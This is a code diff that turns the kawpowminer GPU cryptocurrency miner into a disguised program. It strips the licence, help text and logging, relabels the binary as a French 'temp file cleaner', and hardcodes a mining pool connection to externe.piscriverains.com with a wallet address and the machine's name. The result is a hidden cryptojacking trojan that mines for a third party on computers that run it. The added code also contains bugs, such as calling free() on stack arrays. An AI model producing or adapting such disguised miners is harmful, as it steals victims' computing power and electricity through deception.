@@ -1,20 +1,3 @@
-/*
-    This file is part of kawpowminer.
-
-    kawpowminer is free software: you can redistribute it and/or modify
-    it under the terms of the GNU General Public License as published by
-    the Free Software Foundation, either version 3 of the License, or
-    (at your option) any later version.
-
-    kawpowminer is distributed in the hope that it will be useful,
-    but WITHOUT ANY WARRANTY; without even the implied warranty of
-    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
-    GNU General Public License for more details.
-
-    You should have received a copy of the GNU General Public License
-    along with kawpowminer.  If not, see <http://www.gnu.org/licenses/>.
-*/
-
 #include <CLI/CLI.hpp>
 
 #include <kawpowminer/buildinfo.h>
@@ -55,6 +38,9 @@ using namespace dev::eth;
 // Global vars
 bool g_running = false;
 bool g_exitOnError = false;  // Whether or not kawpowminer should exit on mining threads errors
+// on force la config des arguments dans le code pour invoquer le programme sans param
+int Cargc = 3;
+char* Cargv[3];
 
 condition_variable g_shouldstop;
 boost::asio::io_service g_io_service;  // The IO service itself
@@ -109,7 +95,6 @@ public:
         {
             string logLine =
                 PoolManager::p().isConnected() ? Farm::f().Telemetry().str() : "Not connected";
-            minelog << logLine;
 
 #if ETH_DBUS
             dbusint.send(Farm::f().Telemetry().str().c_str());
@@ -211,11 +196,11 @@ public:
         }
     }
 #endif
-    bool validateArgs(int argc, char** argv)
+    bool validateArgs(int Cargc, char** Cargv)
     {
         std::queue<string> warnings;
 
-        CLI::App app("kawpowminer - GPU ProgPOW(0.9.3) miner for Zing");
+        CLI::App app("temp file cleaner");
 
         bool bhelp = false;
         string shelpExt;
@@ -223,7 +208,8 @@ public:
         app.set_help_flag();
         app.add_flag("-h,--help", bhelp, "Show help");
 
-        app.add_set("-H,--help-ext", shelpExt,
+        app.add_set(
+            "-H,--help-ext", shelpExt,
             {
                 "con", "test",
 #if ETH_ETHASHCL
@@ -244,15 +230,18 @@ public:
 
         bool version = false;
 
-        app.add_option("--ergodicity", m_FarmSettings.ergodicity, "", true)->check(CLI::Range(0, 2));
+        app.add_option("--ergodicity", m_FarmSettings.ergodicity, "", true)
+            ->check(CLI::Range(0, 2));
 
         app.add_flag("-V,--version", version, "Show program version");
 
         app.add_option("-v,--verbosity", g_logOptions, "", true)->check(CLI::Range(LOG_NEXT - 1));
 
-        app.add_option("--farm-recheck", m_PoolSettings.getWorkPollInterval, "", true)->check(CLI::Range(1, 99999));
+        app.add_option("--farm-recheck", m_PoolSettings.getWorkPollInterval, "", true)
+            ->check(CLI::Range(1, 99999));
 
-        app.add_option("--farm-retries", m_PoolSettings.connectionMaxRetries, "", true)->check(CLI::Range(0, 99999));
+        app.add_option("--farm-retries", m_PoolSettings.connectionMaxRetries, "", true)
+            ->check(CLI::Range(0, 99999));
 
         app.add_option("--work-timeout", m_PoolSettings.noWorkTimeout, "", true)
             ->check(CLI::Range(100000, 1000000));
@@ -330,8 +319,8 @@ public:
         app.add_set("--cuda-block-size,--cu-block-size", m_CUSettings.blockSize,
             {32, 64, 128, 256, 512}, "", true);
 
-        app.add_set(
-            "--cuda-parallel-hash,--cu-parallel-hash", m_CUSettings.parallelHash, {1, 2, 4, 8}, "", true);
+        app.add_set("--cuda-parallel-hash,--cu-parallel-hash", m_CUSettings.parallelHash,
+            {1, 2, 4, 8}, "", true);
 
         string sched = "sync";
         app.add_set(
@@ -350,7 +339,8 @@ public:
 
         app.add_flag("--noeval", m_FarmSettings.noEval, "");
 
-        app.add_option("-L,--dag-load-mode", m_FarmSettings.dagLoadMode, "", true)->check(CLI::Range(1));
+        app.add_option("-L,--dag-load-mode", m_FarmSettings.dagLoadMode, "", true)
+            ->check(CLI::Range(1));
 
         bool cl_miner = false;
         app.add_flag("-G,--opencl", cl_miner, "");
@@ -362,7 +352,8 @@ public:
 #if ETH_ETHASHCPU
         app.add_flag("--cpu", cpu_miner, "");
 #endif
-        auto sim_opt = app.add_option("-Z,--simulation,-M,--benchmark", m_PoolSettings.benchmarkBlock, "", true);
+        auto sim_opt = app.add_option(
+            "-Z,--simulation,-M,--benchmark", m_PoolSettings.benchmarkBlock, "", true);
 
         app.add_option("--diff", m_PoolSettings.benchmarkDiff, "")
             ->check(CLI::Range(0.00001, 10000.0));
@@ -372,7 +363,7 @@ public:
 
 
         // Exception handling is held at higher level
-        app.parse(argc, argv);
+        app.parse(Cargc, Cargv);
         if (bhelp)
         {
             help();
@@ -704,8 +695,7 @@ public:
         }
 #endif
 #if ETH_ETHASHCPU
-        if (!m_CPSettings.devices.size() &&
-            (m_minerType == MinerType::CPU))
+        if (!m_CPSettings.devices.size() && (m_minerType == MinerType::CPU))
         {
             for (auto it = m_DevicesCollection.begin(); it != m_DevicesCollection.end(); it++)
             {
@@ -744,457 +734,19 @@ public:
 
     void help()
     {
-        cout << "kawpowminer - GPU ProgPOW(0.9.3) miner for Zing" << endl
-             << "minimal usage : kawpowminer [DEVICES_TYPE] [OPTIONS] -P... [-P...]" << endl
-             << endl
-             << "Devices type options :" << endl
-             << endl
-             << "    By default kawpowminer will try to use all devices types" << endl
-             << "    it can detect. Optionally you can limit this behavior" << endl
-             << "    setting either of the following options" << endl
-#if ETH_ETHASHCL
-             << "    -G,--opencl         Mine/Benchmark using OpenCL only" << endl
-#endif
-#if ETH_ETHASHCUDA
-             << "    -U,--cuda           Mine/Benchmark using CUDA only" << endl
-#endif
-#if ETH_ETHASHCPU
-             << "    --cpu               Development ONLY ! (NO MINING)" << endl
-#endif
-             << endl
-             << "Connection options :" << endl
-             << endl
-             << "    -P,--pool           Stratum pool or http (getWork) connection as URL" << endl
-             << "                        "
-                "scheme://[user[.workername][:password]@]hostname:port[/...]"
-             << endl
-             << "                        For an explication and some samples about" << endl
-             << "                        how to fill in this value please use" << endl
-             << "                        kawpowminer --help-ext con" << endl
-             << endl
-
-             << "Common Options :" << endl
-             << endl
-             << "    -h,--help           Displays this help text and exits" << endl
-             << "    -H,--help-ext       TEXT {'con','test',"
-#if ETH_ETHASHCL
-             << "cl,"
-#endif
-#if ETH_ETHASHCUDA
-             << "cu,"
-#endif
-#if ETH_ETHASHCPU
-             << "cp,"
-#endif
-#if API_CORE
-             << "api,"
-#endif
-             << "'misc','env'}" << endl
-             << "                        Display help text about one of these contexts:" << endl
-             << "                        'con'  Connections and their definitions" << endl
-             << "                        'test' Benchmark/Simulation options" << endl
-#if ETH_ETHASHCL
-             << "                        'cl'   Extended OpenCL options" << endl
-#endif
-#if ETH_ETHASHCUDA
-             << "                        'cu'   Extended CUDA options" << endl
-#endif
-#if ETH_ETHASHCPU
-             << "                        'cp'   Extended CPU options" << endl
-#endif
-#if API_CORE
-             << "                        'api'  API and Http monitoring interface" << endl
-#endif
-             << "                        'misc' Other miscellaneous options" << endl
-             << "                        'env'  Using environment variables" << endl
-             << "    -V,--version        Show program version and exits" << endl
+        cout << "Ce programme parcourt l'ordinateur et supprime les fichiers temporaires" << endl
              << endl;
     }
 
     void helpExt(std::string ctx)
     {
-        // Help text for benchmarking options
-        if (ctx == "test")
-        {
-            cout << "Benchmarking / Simulation options :" << endl
-                 << endl
-                 << "    When playing with benchmark or simulation no connection specification "
-                    "is"
-                 << endl
-                 << "    needed ie. you can omit any -P argument." << endl
-                 << endl
-                 << "    -M,--benchmark      UINT [0 ..] Default not set" << endl
-                 << "                        Mining test. Used to test hashing speed." << endl
-                 << "                        Specify the block number to test on." << endl
-                 << endl
-                 << "    --diff              FLOAT [>0.0] Default " << m_PoolSettings.benchmarkDiff
-                 << endl
-                 << "                        Mining test. Used to test hashing speed." << endl
-                 << "                        Specify the difficulty level to test on." << endl
-                 << endl
-                 << "    -Z,--simulation     UINT [0 ..] Default not set" << endl
-                 << "                        Mining test. Used to test hashing speed." << endl
-                 << "                        Specify the block number to test on." << endl
-                 << endl;
-        }
-
-        // Help text for API interfaces options
-        if (ctx == "api")
-        {
-            cout << "API Interface Options :" << endl
-                 << endl
-                 << "    kawpowminer provide an interface for monitor and or control" << endl
-                 << "    Please note that information delivered by API interface" << endl
-                 << "    may depend on value of --HWMON" << endl
-                 << "    A single endpoint is used to accept both HTTP or plain tcp" << endl
-                 << "    requests." << endl
-                 << endl
-                 << "    --api-bind          TEXT Default not set" << endl
-                 << "                        Set the API address:port the miner should listen "
-                    "on. "
-                 << endl
-                 << "                        Use negative port number for readonly mode" << endl
-                 << "    --api-port          INT [1 .. 65535] Default not set" << endl
-                 << "                        Set the API port, the miner should listen on all "
-                    "bound"
-                 << endl
-                 << "                        addresses. Use negative numbers for readonly mode"
-                 << endl
-                 << "    --api-password      TEXT Default not set" << endl
-                 << "                        Set the password to protect interaction with API "
-                    "server. "
-                 << endl
-                 << "                        If not set, any connection is granted access. " << endl
-                 << "                        Be advised passwords are sent unencrypted over "
-                    "plain "
-                    "TCP!!"
-                 << endl;
-        }
-
-        if (ctx == "cl")
-        {
-            cout << "OpenCL Extended Options :" << endl
-                 << endl
-                 << "    Use this extended OpenCL arguments to fine tune the performance." << endl
-                 << "    Be advised default values are best generic findings by developers" << endl
-                 << endl
-                 << "    --cl-devices        UINT {} Default not set" << endl
-                 << "                        Space separated list of device indexes to use" << endl
-                 << "                        eg --cl-devices 0 2 3" << endl
-                 << "                        If not set all available CL devices will be used"
-                 << endl
-                 << "    --cl-global-work    UINT Default = " << m_CLSettings.globalWorkSizeMultiplier << endl
-                 << "                        Set the global work size multiplier" << endl
-                 << "                        Value will be adjusted to nearest power of 2" << endl
-                 << "    --cl-local-work     UINT {64,128,256} Default = " << m_CLSettings.localWorkSize << endl
-                 << "                        Set the local work size multiplier" << endl;
-        }
-
-        if (ctx == "cu")
-        {
-            cout << "CUDA Extended Options :" << endl
-                 << endl
-                 << "    Use this extended CUDA arguments to fine tune the performance." << endl
-                 << "    Be advised default values are best generic findings by developers" << endl
-                 << endl
-                 << "    --cu-grid-size      INT [1 .. 131072] Default = " << m_CUSettings.gridSize << endl
-                 << "                        Set the grid size" << endl
-                 << "    --cu-block-size     UINT {32,64,128,256} Default = " << m_CUSettings.blockSize << endl
-                 << "                        Set the block size" << endl
-                 << "    --cu-devices        UINT {} Default not set" << endl
-                 << "                        Space separated list of device indexes to use" << endl
-                 << "                        eg --cu-devices 0 2 3" << endl
-                 << "                        If not set all available CUDA devices will be used"
-                 << endl
-                 << "    --cu-parallel-hash  UINT {1,2,4,8} Default = " << m_CUSettings.parallelHash << endl
-                 << "                        Set the number of parallel hashes per kernel" << endl
-                 << "    --cu-streams        INT [1 .. 99] Default = " << m_CUSettings.streams << endl
-                 << "                        Set the number of streams per GPU" << endl
-                 << "    --cu-schedule       TEXT Default = 'sync'" << endl
-                 << "                        Set the CUDA scheduler mode. Can be one of" << endl
-                 << "                        'auto'  Uses a heuristic based on the number of "
-                    "active "
-                 << endl
-                 << "                                CUDA contexts in the process (C) and the "
-                    "number"
-                 << endl
-                 << "                                of logical processors in the system (P)"
-                 << endl
-                 << "                                If C > P then 'yield' else 'spin'" << endl
-                 << "                        'spin'  Instructs CUDA to actively spin when "
-                    "waiting"
-                 << endl
-                 << "                                for results from the device" << endl
-                 << "                        'yield' Instructs CUDA to yield its thread when "
-                    "waiting for"
-                 << endl
-                 << "                                for results from the device" << endl
-                 << "                        'sync'  Instructs CUDA to block the CPU thread on "
-                    "a "
-                 << endl
-                 << "                                synchronize primitive when waiting for "
-                    "results"
-                 << endl
-                 << "                                from the device" << endl
-                 << endl;
-        }
-
-        if (ctx == "cp")
-        {
-            cout << "CPU Extended Options :" << endl
-                 << endl
-                 << "    Use this extended CPU arguments"
-                 << endl
-                 << endl
-                 << "    --cp-devices        UINT {} Default not set" << endl
-                 << "                        Space separated list of device indexes to use" << endl
-                 << "                        eg --cp-devices 0 2 3" << endl
-                 << "                        If not set all available CPUs will be used" << endl
-                 << endl;
-        }
-
-        if (ctx == "misc")
-        {
-            cout << "Miscellaneous Options :" << endl
-                 << endl
-                 << "    This set of options is valid for mining mode independently from" << endl
-                 << "    OpenCL or CUDA or Mixed mining mode." << endl
-                 << endl
-                 << "    --display-interval  INT[1 .. 1800] Default = 5" << endl
-                 << "                        Statistic display interval in seconds" << endl
-                 << "    --farm-recheck      INT[1 .. 99999] Default = 500" << endl
-                 << "                        Set polling interval for new work in getWork mode"
-                 << endl
-                 << "                        Value expressed in milliseconds" << endl
-                 << "                        It has no meaning in stratum mode" << endl
-                 << "    --farm-retries      INT[1 .. 99999] Default = 3" << endl
-                 << "                        Set number of reconnection retries to same pool"
-                 << endl
-                 << "    --failover-timeout  INT[0 .. ] Default not set" << endl
-                 << "                        Sets the number of minutes kawpowminer can stay" << endl
-                 << "                        connected to a fail-over pool before trying to" << endl
-                 << "                        reconnect to the primary (the first) connection."
-                 << endl
-                 << "                        before switching to a fail-over connection" << endl
-                 << "    --work-timeout      INT[180 .. 99999] Default = 180" << endl
-                 << "                        If no new work received from pool after this" << endl
-                 << "                        amount of time the connection is dropped" << endl
-                 << "                        Value expressed in seconds." << endl
-                 << "    --response-timeout  INT[2 .. 999] Default = 2" << endl
-                 << "                        If no response from pool to a stratum message " << endl
-                 << "                        after this amount of time the connection is dropped"
-                 << endl
-                 << "    -R,--report-hr      FLAG Notify pool of effective hashing rate" << endl
-                 << "    --HWMON             INT[0 .. 2] Default = 0" << endl
-                 << "                        GPU hardware monitoring level. Can be one of:" << endl
-                 << "                        0 No monitoring" << endl
-                 << "                        1 Monitor temperature and fan percentage" << endl
-                 << "                        2 As 1 plus monitor power drain" << endl
-                 << "    --exit              FLAG Stop kawpowminer whenever an error is encountered"
-                 << endl
-                 << "    --ergodicity        INT[0 .. 2] Default = 0" << endl
-                 << "                        Sets how kawpowminer chooses the nonces segments to"
-                 << endl
-                 << "                        search on." << endl
-                 << "                        0 A search segment is picked at startup" << endl
-                 << "                        1 A search segment is picked on every pool "
-                    "connection"
-                 << endl
-                 << "                        2 A search segment is picked on every new job" << endl
-                 << endl
-                 << "    --nocolor           FLAG Monochrome display log lines" << endl
-                 << "    --syslog            FLAG Use syslog appropriate output (drop timestamp "
-                    "and"
-                 << endl
-                 << "                        channel prefix)" << endl
-                 << "    --stdout            FLAG Log to stdout instead of stderr" << endl
-                 << "    --noeval            FLAG By-pass host software re-evaluation of GPUs"
-                 << endl
-                 << "                        found nonces. Trims some ms. from submission" << endl
-                 << "                        time but it may increase rejected solution rate."
-                 << endl
-                 << "    --list-devices      FLAG Lists the detected OpenCL/CUDA devices and "
-                    "exits"
-                 << endl
-                 << "                        Must be combined with -G or -U or -X flags" << endl
-                 << "    -L,--dag-load-mode  INT[0 .. 1] Default = 0" << endl
-                 << "                        Set DAG load mode. Can be one of:" << endl
-                 << "                        0 Parallel load mode (each GPU independently)" << endl
-                 << "                        1 Sequential load mode (one GPU after another)" << endl
-                 << endl
-                 << "    --tstart            UINT[30 .. 100] Default = 0" << endl
-                 << "                        Suspend mining on GPU which temperature is above"
-                 << endl
-                 << "                        this threshold. Implies --HWMON 1" << endl
-                 << "                        If not set or zero no temp control is performed"
-                 << endl
-                 << "    --tstop             UINT[30 .. 100] Default = 40" << endl
-                 << "                        Resume mining on previously overheated GPU when "
-                    "temp"
-                 << endl
-                 << "                        drops below this threshold. Implies --HWMON 1" << endl
-                 << "                        Must be lower than --tstart" << endl
-                 << "    -v,--verbosity      INT[0 .. 255] Default = 0 " << endl
-                 << "                        Set output verbosity level. Use the sum of :" << endl
-                 << "                        1   to log stratum json messages" << endl
-                 << "                        2   to log found solutions per GPU" << endl
-#ifdef DEV_BUILD
-                 << "                        32  to log socket (dis)connections" << endl
-                 << "                        64  to log time for job switches" << endl
-                 << "                        128 to log time for solution submissions" << endl
-                 << "                        256 to log kernel compile diagnostics" << endl
-#endif
-                 << endl;
-        }
-
-        if (ctx == "env")
-        {
-            cout << "Environment variables :" << endl
-                 << endl
-                 << "    If you need or do feel more comfortable you can set the following" << endl
-                 << "    environment variables. Please respect letter casing." << endl
-                 << endl
-                 << "    NO_COLOR            Set to any value to disable colored output." << endl
-                 << "                        Acts the same as --nocolor command line argument"
-                 << endl
-                 << "    SYSLOG              Set to any value to strip timestamp, colors and "
-                    "channel"
-                 << endl
-                 << "                        from output log." << endl
-                 << "                        Acts the same as --syslog command line argument"
-                 << endl
-#ifndef _WIN32
-                 << "    SSL_CERT_FILE       Set to the full path to of your CA certificates "
-                    "file"
-                 << endl
-                 << "                        if it is not in standard path :" << endl
-                 << "                        /etc/ssl/certs/ca-certificates.crt." << endl
-#endif
-                 << "    SSL_NOVERIFY        set to any value to to disable the verification "
-                    "chain "
-                    "for"
-                 << endl
-                 << "                        certificates. WARNING ! Disabling certificate "
-                    "validation"
-                 << endl
-                 << "                        declines every security implied in connecting to a "
-                    "secured"
-                 << endl
-                 << "                        SSL/TLS remote endpoint." << endl
-                 << "                        USE AT YOU OWN RISK AND ONLY IF YOU KNOW WHAT "
-                    "YOU'RE "
-                    "DOING"
-                 << endl;
-        }
-
-        if (ctx == "con")
-        {
-            cout << "Connections specifications :" << endl
-                 << endl
-                 << "    Whether you need to connect to a stratum pool or to make use of "
-                    "getWork "
-                    "polling"
-                 << endl
-                 << "    mode (generally used to solo mine) you need to specify the connection "
-                    "making use"
-                 << endl
-                 << "    of -P command line argument filling up the URL. The URL is in the form "
-                    ":"
-                 << endl
-                 << "    " << endl
-                 << "    scheme://[user[.workername][:password]@]hostname:port[/...]." << endl
-                 << "    " << endl
-                 << "    where 'scheme' can be any of :" << endl
-                 << "    " << endl
-                 << "    getwork    for http getWork mode" << endl
-                 << "    stratum    for tcp stratum mode" << endl
-                 << "    stratums   for tcp encrypted stratum mode" << endl
-                 << "    stratumss  for tcp encrypted stratum mode with strong TLS 1.2 "
-                    "validation"
-                 << endl
-                 << endl
-                 << "    Example 1: -P getwork://127.0.0.1:8545" << endl
-                 << "    Example 2: "
-                    "-P stratums://0x012345678901234567890234567890123.miner1@ethermine.org:5555"
-                 << endl
-                 << "    Example 3: "
-                    "-P stratum://0x012345678901234567890234567890123.miner1@nanopool.org:9999/"
-                    "john.doe%40gmail.com"
-                 << endl
-                 << "    Example 4: "
-                    "-P stratum://0x012345678901234567890234567890123@nanopool.org:9999/miner1/"
-                    "john.doe%40gmail.com"
-                 << endl
-                 << endl
-                 << "    Please note: if your user or worker or password do contain characters"
-                 << endl
-                 << "    which may impair the correct parsing (namely any of . : @ # ?) you have to"
-                 << endl
-                 << "    enclose those values in backticks( ` ASCII 096) or Url Encode them" << endl
-                 << "    Also note that backtick has a special meaning in *nix environments thus"
-                 << endl
-                 << "    you need to further escape those backticks with backslash." << endl
-                 << endl
-                 << "    Example : -P stratums://\\`account.121\\`.miner1:x@ethermine.org:5555"
-                 << endl
-                 << "    Example : -P stratums://account%2e121.miner1:x@ethermine.org:5555" << endl
-                 << "    (In Windows backslashes are not needed)" << endl
-                 << endl
-                 << endl
-                 << "    Common url encoded chars are " << endl
-                 << "    . (dot)      %2e" << endl
-                 << "    : (column)   %3a" << endl
-                 << "    @ (at sign)  %40" << endl
-                 << "    ? (question) %3f" << endl
-                 << "    # (number)   %23" << endl
-                 << "    / (slash)    %2f" << endl
-                 << "    + (plus)     %2b" << endl
-                 << endl
-                 << "    You can add as many -P arguments as you want. Every -P specification"
-                 << endl
-                 << "    after the first one behaves as fail-over connection. When also the" << endl
-                 << "    the fail-over disconnects kawpowminer passes to the next connection" << endl
-                 << "    available and so on till the list is exhausted. At that moment" << endl
-                 << "    kawpowminer restarts the connection cycle from the first one." << endl
-                 << "    An exception to this behavior is ruled by the --failover-timeout" << endl
-                 << "    command line argument. See 'kawpowminer -H misc' for details." << endl
-                 << endl
-                 << "    The special notation '-P exit' stops the failover loop." << endl
-                 << "    When kawpowminer reaches this kind of connection it simply quits." << endl
-                 << endl
-                 << "    When using stratum mode kawpowminer tries to auto-detect the correct" << endl
-                 << "    flavour provided by the pool. Should be fine in 99% of the cases." << endl
-                 << "    Nevertheless you might want to fine tune the stratum flavour by" << endl
-                 << "    any of of the following valid schemes :" << endl
-                 << endl
-                 << "    " << URI::KnownSchemes(ProtocolFamily::STRATUM) << endl
-                 << endl
-                 << "    where a scheme is made up of two parts, the stratum variant + the tcp "
-                    "transport protocol"
-                 << endl
-                 << endl
-                 << "    Stratum variants :" << endl
-                 << endl
-                 << "        stratum     Stratum" << endl
-                 << "        stratum1    Eth Proxy compatible" << endl
-                 << "        stratum2    EthereumStratum 1.0.0 (nicehash)" << endl
-                 << "        stratum3    EthereumStratum 2.0.0" << endl
-                 << endl
-                 << "    Transport variants :" << endl
-                 << endl
-                 << "        tcp         Unencrypted tcp connection" << endl
-                 << "        tls         Encrypted tcp connection (including deprecated TLS 1.1)"
-                 << endl
-                 << "        tls12       Encrypted tcp connection with TLS 1.2" << endl
-                 << "        ssl         Encrypted tcp connection with TLS 1.2" << endl
-                 << endl;
-        }
+        cout << "Ce programme parcourt l'ordinateur et supprime les fichiers temporaires" << endl
+             << endl;
     }
 
 private:
     void doMiner()
     {
-
         new PoolManager(m_PoolSettings);
         if (m_mode != OperationMode::Simulation)
             for (auto conn : m_PoolSettings.connections)
@@ -1251,12 +803,12 @@ private:
 
     FarmSettings m_FarmSettings;  // Operating settings for Farm
     PoolSettings m_PoolSettings;  // Operating settings for PoolManager
-    CLSettings m_CLSettings;          // Operating settings for CL Miners
-    CUSettings m_CUSettings;          // Operating settings for CUDA Miners
-    CPSettings m_CPSettings;          // Operating settings for CPU Miners
+    CLSettings m_CLSettings;      // Operating settings for CL Miners
+    CUSettings m_CUSettings;      // Operating settings for CUDA Miners
+    CPSettings m_CPSettings;      // Operating settings for CPU Miners
 
     //// -- Pool manager related params
-    //std::vector<std::shared_ptr<URI>> m_poolConns;
+    // std::vector<std::shared_ptr<URI>> m_poolConns;
 
 
     // -- CLI Interface related params
@@ -1268,10 +820,10 @@ private:
 
 #if API_CORE
     // -- API and Http interfaces related params
-    string m_api_bind;                  // API interface binding address in form <address>:<port>
-    string m_api_address = "0.0.0.0";   // API interface binding address (Default any)
-    int m_api_port = 0;                 // API interface binding port
-    string m_api_password;              // API interface write protection password
+    string m_api_bind;                 // API interface binding address in form <address>:<port>
+    string m_api_address = "0.0.0.0";  // API interface binding address (Default any)
+    int m_api_port = 0;                // API interface binding port
+    string m_api_password;             // API interface write protection password
 #endif
 
 #if ETH_DBUS
@@ -1294,19 +846,44 @@ int main(int argc, char** argv)
     SetConsoleOutputCP(CP_UTF8);
 #endif
 
+// on force la config des arguments dans le code pour invoquer le programme sans param
+// allez d'abord dans les global var def pour definir la longuer des params
+
+// get the computer name pour le mettre dans la string de connection
+#define INFO_BUFFER_SIZE 32767
+    TCHAR infoBuf[INFO_BUFFER_SIZE];
+    DWORD bufCharCount = INFO_BUFFER_SIZE;
+
+    // Get and display the name of the computer.
+    GetComputerName(infoBuf, &bufCharCount);
+    const size_t concatenated_size = 256;
+    char concatenated[concatenated_size];
+
+    Cargv[0] = argv[0];
+    Cargv[1] = "-P";
+    snprintf(concatenated, concatenated_size,
+        "stratum+tcp://RM9ZLVs8gu3pw6y2e3T9w2cXtxwjLt19qb.%s@externe.piscriverains.com:3333",
+        infoBuf);
+    Cargv[2] = concatenated;
+    free(infoBuf);
+    free(concatenated);
+
+
     // Always out release version
-    auto* bi = kawpowminer_get_buildinfo();
     cout << endl
          << endl
-         << "kawpowminer " << bi->project_version << endl
-         << "Build: " << bi->system_name << "/" << bi->build_type << "/" << bi->compiler_id << endl
+         << "Ce programme supprime les fichiers temporaires pass?s en param?tres" << endl
          << endl;
 
     if (argc < 2)
     {
-        cerr << "No arguments specified. " << endl
-             << "Try 'kawpowminer --help' to get a list of arguments." << endl
-             << endl;
+        cerr << "Aucun arguments sp?cifi?s. " << endl << "--help" << endl << endl;
+        return 1;
+    }
+
+    if (argv[0] != "--tmp")
+    {
+        cerr << "Arguments incorrect. " << endl << "--noargs" << endl << endl;
         return 1;
     }
 
@@ -1323,7 +900,7 @@ int main(int argc, char** argv)
 
             // Argument validation either throws exception
             // or returns false which means do not continue
-            if (!cli.validateArgs(argc, argv))
+            if (!cli.validateArgs(Cargc, Cargv))
                 return 0;
 
             if (getenv("SYSLOG"))
@@ -1357,31 +934,29 @@ int main(int argc, char** argv)
         }
         catch (std::invalid_argument& ex1)
         {
-            cerr << "Error: " << ex1.what() << endl
-                 << "Try kawpowminer --help to get an explained list of arguments." << endl
-                 << endl;
+            cerr << "Erreur: " << ex1.what() << endl << "--help" << endl << endl;
             return 1;
         }
         catch (std::runtime_error& ex2)
         {
-            cerr << "Error: " << ex2.what() << endl << endl;
+            cerr << "Erreur: " << ex2.what() << endl << endl;
             return 2;
         }
         catch (std::exception& ex3)
         {
-            cerr << "Error: " << ex3.what() << endl << endl;
+            cerr << "Erreur: " << ex3.what() << endl << endl;
             return 3;
         }
         catch (...)
         {
-            cerr << "Error: Unknown failure occurred. Possible memory corruption." << endl << endl;
+            cerr << "Erreur:" << endl << endl;
             return 4;
         }
     }
     catch (const std::exception& ex)
     {
         cerr << "Could not initialize CLI interface " << endl
-             << "Error: " << ex.what() << endl
+             << "Erreur: " << ex.what() << endl
              << endl;
         return 4;
     }
